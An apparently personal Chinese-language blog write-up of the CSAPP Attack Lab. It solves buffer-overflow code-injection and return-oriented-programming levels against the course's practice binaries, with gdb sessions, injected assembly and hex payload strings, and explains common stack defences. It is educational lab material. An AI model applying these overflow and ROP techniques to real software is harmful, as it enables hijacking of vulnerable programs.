---
title: "CSAPP: Attack Lab"
date: 2020-05-10
language: zh
canonical: true
translationKey: csapp-attack-lab
tags:
  - csapp
  - computer-science
  - csapp
math: true
toc: true
draft: false
---


# 实验内容

本实验是 CSAPP:3e 一书的配套实验之一，相关资料如下：

- [实验文件](http://csapp.cs.cmu.edu/3e/target1.tar)
- [实验要求](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

在本次实验中，我们将试着对给定的可在 Linux 下运行的二进制文件进行缓冲区溢出攻击。实验一共分为五个部分，每一个部分的具体要求都会在后文中详述。

本文随自己的实验进度缓慢更新……~~（咕咕）~~

# 知识回顾

**对于 x86 平台，程序运行时调用函数的过程是怎样的？**

为了能够实现函数递归，函数调用的相关信息都是在 *栈 (stack)* 中进行维护的。在 x86 汇编中，寄存器 `%rsp` 指向栈顶位置，寄存器 `%rbp` 指向栈起始的位置，同时栈是从高地址向低地址生长的。当调用函数时，大致需要依次进行如下步骤：

- 将参数按照从右至左顺序压入栈中；
- 将返回地址压入栈中；
- 将旧的 `%rbp` 值压入栈中，并将 `%rbp` 的值更新为 `%rsp`。换言之，这一步即为被调用的函数更新栈的起始位置；
- 接下来便可以执行被调用的函数了；
- 执行完后，将旧 `%rbp` 值从栈中弹出，并恢复 `%rbp` 的值（因为现在回到之前的函数了）；
- 执行 `ret` 指令，跳转到返回地址（这一过程中会将栈中的参数以及返回地址弹出）。

可见，如果被执行的函数中调用了 `gets()` 函数（即允许用户输入字符串）同时没有增加任何额外安全措施，我们可以通过精心构造字符串，使得该字符串长度超出缓冲区大小，以达到对栈中其他位置的信息进行覆盖的目的。例如，我们可以通过覆盖返回地址字段，使得该函数被执行完后返回到其他的位置。更进一步，甚至可能注入自己构造的恶意代码来达到各种恶意的目的。接下来的实验就会更具体地说明这一点。

# 实验

## Level 1

### 要求

在 Level 1 中，暂且不要求注入自己构造的代码，而是构造一个字符串，使得程序执行另一处已有的代码。

在二进制可执行文件 `ctarget` 中，`getbuf()` 函数则是一个存在漏洞的获取用户输入的函数。其源代码如下：

```c
unsigned getbuf() 
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

其中 `Gets()` 与标准库中的 `gets()` 类似，它会一直读入字符串知道遇到结束符为止，而不会对缓冲区大小是否溢出进行任何检查。`getbuf()` 函数在 `test()` 函数中被调用，其源代码如下：

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

`getbuf()` 在执行完成后会返回到 `test()` 继续向后执行。我们的目的是让 `getbuf()` 执行完后跳转到程序 `touch1()` 函数处进行执行。`touch1()` 的源代码如下：

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

由于本菜鸡不是 CMU 的学生，因此自然也没发连接到 CMU 记录分数的服务器。因此在运行 `ctarget` 时需要加上参数 `-q` 以避免前述服务器进行连接。另外，由于构造出的字符串很可能包含非法的 ASCII 字符，为了方便大家，`ctarget` 支持二进制文件中读取信息。同时，作者也很贴心地提供了小工具 `hex2raw` 以帮助大家把构造好的 16进制 字符串转换为二进制文件。我们首先要将我们构造好的字符串逐字节一个文本文件（如 `hex.txt`），每一个字节均使用两位16进制表示，并且字符之间用空格隔开。如：

```
0a 2d 3f ...
```

便可以生成对应二进制文件：

```
$ hex2raw < hex.txt > raw
```

最后再将其传给 `ctarget`：

```
$ ctarget -q -i raw
```

### 过程

先运行一下 `./ctarget` 看看它长啥样：

```
$ ./ctarget -q
Cookie: 0x59b997fa
Type string:Hello World!
No exploit.  Getbuf returned 0x1
Normal return
```

整个程序会要求我们输入一个字符串并显示一些结果。在这里我首先输入了 `Hello, World!`。显然这个字符串是不足以让程序出现问题的，因此其提示 `No exploit`。而我们的目的是执行函数 `touch1()`，故若成功其提示应当包含 `Touch1!: You called touch1()`。

首先来看看 `getbuf()` 的汇编代码：

```
$ gdb --args ./ctarget -q

(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:   sub    $0x28,%rsp
   0x00000000004017ac <+4>:   mov    %rsp,%rdi
   0x00000000004017af <+7>:   callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:  mov    $0x1,%eax
   0x00000000004017b9 <+17>:  add    $0x28,%rsp
   0x00000000004017bd <+21>:  retq   
End of assembler dump.
```

第一条指令表明栈顶 `%rsp` 向下生长了 `0x28`（即 40）个字节，故得知 `BUFFER_SIZE` 值为 40。输入的字符是从低地址向高地址存储的，恰好函数的返回地址也在高地址里，这为修改函数返回地址提供了可能。不妨在 `getbuf()` 处（即 `*0x4017a8` 处）打上断点，此时栈顶应当指向返回地址：

```
(gdb) b getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.

(gdb) r
Starting program: /home/codgician/GitHub/explorations/CSAPP/attack-lab/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12

(gdb) x $rsp
0x5561dca0:	0x00401976

(gdb) x 0x00401976
0x401976 <test+14>:	0x88bec289
```

可见栈顶 `0x5561dca0` 中的值为 `0x00401976`。而该地址恰好指向 `test()` 中调用 `getbuf()` 之后的位置，故可确定这就是我们想要修改的返回地址。来查询一下 `touch1()` 的地址：

```
(gdb) info address touch1
Symbol "touch1" is a function at address 0x4017c0.
```

需要注意的是，由于 x86 采取 *小端 (Little Endian)* 字节顺序，若希望栈中出现 `0x004017c0`，则我们构造的输入应当为 `c0 17 40 00`。基于上述分析，我们构造的字符串只需要首先包含 40 个任意字符，接下來再包含目标地址即可。`hex.txt` 内容如下：

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00
```

使用 `hex2raw` 将其转换为二进制文件后传入 `ctarget`，便可以达成目的：

```
$ ./hex2raw < hex.txt > raw && ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
  user id	bovik
  course	15213-f15
  lab	attacklab
  result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 
```

## Level 2

### 要求

在 Level 2 中，要求执行的函数变为 `touch2()`。与上一关不同的是，`touch2()` 函数带有一个参数。其源代码如下：

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

`cookie` 值即之前运行时提示的 `0x59b997fa`。

### 过程

刚开始的时候本菜鸡准备投机取巧：直接跳转到 `if (val == cookie)` 后的语句之处。不过可惜作者早就考虑到了，`validate` 函数中应该还会对 `val` 进行进一步检查，所以就凉了。

复杂一点的思路，便是我们要在构造的字符串中包含调用 `touch2()` 的汇编代码，同时让程序跳转到我们注入的代码处执行。因此我们先来看看 `touch2()` 的汇编代码：

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	  sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	  mov    %edi,%edx
   0x00000000004017f2 <+6>:   movl   $0x2,0x202ce0(%rip)    # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:  cmp    0x202ce2(%rip),%edi    # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:  jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:  mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:  mov    $0x1,%edi
   0x000000000040180e <+34>:  mov    $0x0,%eax
   0x0000000000401813 <+39>:  callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:  mov    $0x2,%edi
   0x000000000040181d <+49>:  callq  0x401c8d <validate>
   0x0000000000401822 <+54>:  jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:  mov    $0x403110,%esi
   0x0000000000401829 <+61>:  mov    $0x1,%edi
   0x000000000040182e <+66>:  mov    $0x0,%eax
   0x0000000000401833 <+71>:  callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:  mov    $0x2,%edi
   0x000000000040183d <+81>:  callq  0x401d4f <fail>
   0x0000000000401842 <+86>:  mov    $0x0,%edi
   0x0000000000401847 <+91>:  callq  0x400e40 <exit@plt>
End of assembler dump.
```

可见，`touch2()` 传入的参数 `val` 被存放在寄存器 `%edi` 中，并且在 `<+16>` 处与 `cookie` 进行比较。因此，在进入 `touch2()` 前我们要将寄存器 `%edi` 中的值修改掉，即如下汇编代码：

```asm
mov $0x59b997fa, %edi
```

除此之外，需要将程序跳转至 `touch2()` 处（地址为 `0x004017ec）。故：

```asm
mov $0x004017ec, %eax
jmp *%eax
```

将上述代码汇编后，得到：

```
BF FA 97 B9 59 B8 EC 17 40 00 FF E0
```

最后，我们借助与 Level 1 类似的思路，让 `getbuf()` 执行完成后跳转到我们刚刚注入的代码，也就是字符串的起始位置 `0x5561dc78`（即 Level 1 中所提到的返回地址的位置减去 `0x28`）。最终构造出如下字符串：

```
BF FA 97 B9 59 B8 EC 17 40 00 FF E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

试试看~

```
$ ./hex2raw < hex.txt > raw && ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 B8 EC 17 40 00 FF E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55
```

## Level 3

### 要求

Level 3 在 Level 2 的基础上做了一些变动：要执行的函数不再以整形为参数，而以一个字符串为参数。`hexmatch()` 和 `touch3()` 都是包含在 `ctarget` 中的函数：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

换言之，我们要传入 Cookie（即 `0x59b997fa`） 对应的字符串，并执行 `touch3()`，得到包含 `Touch3!: You called touch3("59b997fa")` 的结果。

### 过程

先来看看 `touch3()` 的汇编代码：

```
(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)      # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi      # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
   0x000000000040191a <+32>:    mov    %rbx,%rdx
   0x000000000040191d <+35>:    mov    $0x403138,%esi
   0x0000000000401922 <+40>:    mov    $0x1,%edi
   0x0000000000401927 <+45>:	mov    $0x0,%eax
   0x000000000040192c <+50>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:    mov    $0x3,%edi
   0x0000000000401936 <+60>：   callq  0x401c8d <validate>
   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:    mov    %rbx,%rdx
   0x0000000000401940 <+70>:    mov    $0x403160,%esi
   0x0000000000401945 <+75>:    mov    $0x1,%edi
   0x000000000040194a <+80>:    mov    $0x0,%eax
   0x000000000040194f <+85>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:    mov    $0x3,%edi
   0x0000000000401959 <+95>:    callq  0x401d4f <fail>
   0x000000000040195e <+100>:   mov    $0x0,%edi
   0x0000000000401963 <+105>:   callq  0x400e40 <exit@plt>
End of assembler dump.
```

`touch3()` 只包含一个参数，即指向字符串的指针，因此其值应当被存储于寄存器 `%rdi` 中。因此大致的思路为：

- 使用与 Level 1 类似的思路跳转到输入缓冲区开头；
- 输入缓冲区开头处构造修改 `%rdi` 的指令，指向缓冲区中的另一位置（记之为 p）；
- 接下来构造跳转至 `touch3()` 的指令；
- 在 p 处存入 `cookie` 的值。

另外，观察到 `getbuf()` 执行完时 `%rsp` 是指向缓冲区高地址处的。由于后面还涉及 `hexmatch()` 函数的调用，为了防止进栈操作把构造的缓冲区覆盖掉，需要对 `%rsp` 减去缓冲区大小 `0x28`。由于地址没有超出 32 位，下面用 `%edi` 代替 `%rdi` 以减小汇编代码长度：

```asm
sub $0x28, %rsp
mov $0x5561dc88, %edi
mov $0x004018fa, %eax
jmp *%eax
```

汇编后为：

```
83 EC 28 BF 88 DC 61 55 B8 FA 18 40 00 FF E0
```

其中 `0x5561dc88` 即缓冲区最低位置 `0x5561dc78` 加上上述汇编指令对应二进制长度后的结果（长度为 15 字节，对齐为 16 字节）。其指向我们即将构造的 `cookie` 对应字符串的起始地址。

接下来构造 `0x59b997fa` 对应的字符串：

```
35 39 62 39 39 37 66 61
```

因此，完整的字符串应当为：

```
83 EC 28 BF 88 DC 61 55 B8 FA 18 40 00 FF E0 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

试试看~

```
$ ./hex2raw < hex.txt > raw && ./ctarget -q -i raw
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:83 EC 28 BF 88 DC 61 55 B8 FA 18 40 00 FF E0 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

# 面向返回编程

## 回顾

**有办法相对通用地避免前面提到的代码注入吗？**

虽然使用更加安全的 `gets()` 是避免此类漏洞最简单的方案，但能否在不需要程序员对代码本身做任何修改的前提下使得代码注入更加困难？

- **运行时随机化栈地址**: 之前实验中，都需要让程序跳转至缓冲区处执行注入的代码。正是因为缓冲区在栈中的地址每一次运行时都是不变的，才让我们轻松地达到了目的。如果每次运行程序，缓冲区所处的地址都不相同，注入代码会更加困难；
- **将栈标记为不可执行区域**：之前实验中，注入的代码都被存放在栈中。如果将栈标记为不可执行区域，使得程序拒绝执行栈中代码，注入代码便会更加困难；
- **Canary 保护**：其核心思想在于对压入栈的每一帧末尾添加一个额外的随机数（称作 Canary）。这个随机数的作用与金丝雀很像，即一旦发现 Canary 值被更改，则会导致程序运行异常并停止。若想通过溢出来修改返回地址，则必然需要先覆盖掉 Canary。这使得代码注入更加困难了。

**有了保护后就真的没有一点办法了吗？**

虽然没有办法注入自己的代码，但程序本身还是包含非常多指令的。哪怕是非常短的程序，由于大多都会引入标准库，事实上指令数量还是相当可观的。是否可以通过已有的指令来达到我们想达到的目的呢？这就是 *面向返回编程 (ROP, Return Oriented Programming)* 的核心思想。

我们将由 `ret` 指令结尾的的若干指令称作一个 gadget。将多个 gadget 组合起来依次执行便可能达到目的。将 gadget 的地址存放在栈中，并且让 `%rsp` 指向 gadget #1 的地址。在这种状态下，如果程序执行到了 `ret` 指令，则会跳转到 gadget #1 处执行（`%rsp` 指向返回地址），同时 `%rsp` 会向上移动（将返回地址弹栈）并恰好指向栈中 gadget #2 的地址。这样一来，当 gadget #1 执行完 `ret` 后便会跳转到 gadget #2，依次类推…… 这样便将多段汇编代码像链表一样串了起来。

接下来的两个实验将会展示 ROP 的实际应用。

## Level 2+

### 要求

要求与 Level 2 一样（调用 `touch2()`），但目标二进制程序变为 `rtarget`。`rtarget` 包含了上述防御措施中的前两种。另外，要求只能使用前 8 个 x86-64 寄存器（`%rax` ~ `%rdi`）。

为了简化实验，`rtarget` 中已经提供了可能需要用到的 gadget,位于 `start_farm` 标记和 `mid_farm` 标记之间。

### 过程

结合之前的实验，我们得到一个大致的思路：

- 通过缓冲区溢出使程序跳转至 gadget #1；
- 对寄存器 `%rdi` 进行修改（`touch2()` 的参数）；
- 跳转至 `touch2()` 所在的地址继续执行。
- `cookie: 0x59b997fa` 很难恰好出现，因此需要将其作为数据放入缓冲区中，并调用弹栈 `popq` 指令将其存入寄存器中。

首先反汇编，看一下 `start_farm` 和 `mid_farm` 之间有什么：

```
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00      mov    $0x1,%eax
  401999:	c3                  retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90      mov    $0x909078fb,%eax
  40199f:	c3                  retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                  retq

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90   lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                  retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7   movl   $0xc7c78948,(%rdi)
  4019b4:	c3                  retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92   movl   $0x9258c254,(%rdi)
  4019bb:	c3                  retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7   movl   $0xc78d4863,(%rdi)
  4019c2:	c3                  retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90   movl   $0x90c78948,(%rdi)
  4019c9:	c3                  retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3      mov    $0xc3905829,%eax
  4019cf:	c3                  retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00      mov    $0x1,%eax
  4019d5:	c3                  retq   
```

`pop` 指令的字节码为 `58`（从栈中取出 64 位数据），在上述代码中寻找到 `addval_219` 中存在 `58 90 c3`，其反汇编结果恰好为：

```
0: 58   pop %rax
1: 90   nop
2: c3   retq 
```

其含义即将栈顶数据弹出并放入寄存器 `%rax`，因此第一个 gadget 地址可为 `0x004019ab`。我们可通过缓冲区溢出的形式到达此处（Level 1 的思路）。

接下来我们需要将 `%rax` 中的值复制进 `%rdi`。`mov` 的字节码为 `48`。在 `setval_273` 中找到 `48 89 c7 c3`，其反汇编结果恰好为：

```
0: 48 89 c7     mov    %rax, %rdi
3: c3           retq   
```

因此第二个 gadget 地址为 `0x004019a2`。在执行完这两个 gadget 后，就可以进入 `touch2()` 了，因此栈中接下来要放入 `touch2()` 的地址 `0x004017ec`。

构造缓冲区如下（注意将数据补齐 64 位）：

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

试一试~

```
$ ./hex2raw < hex.txt > raw && ./rtarget -q -i raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

## Level 3+

等到有空的时候继续～

### 要求

要求与 Level 3 一样（调用 `touch3()`），但目标二进制程序变为 `rtarget`。`rtarget` 包含了上述防御措施中的前两种。

### 过程

咕咕咕……
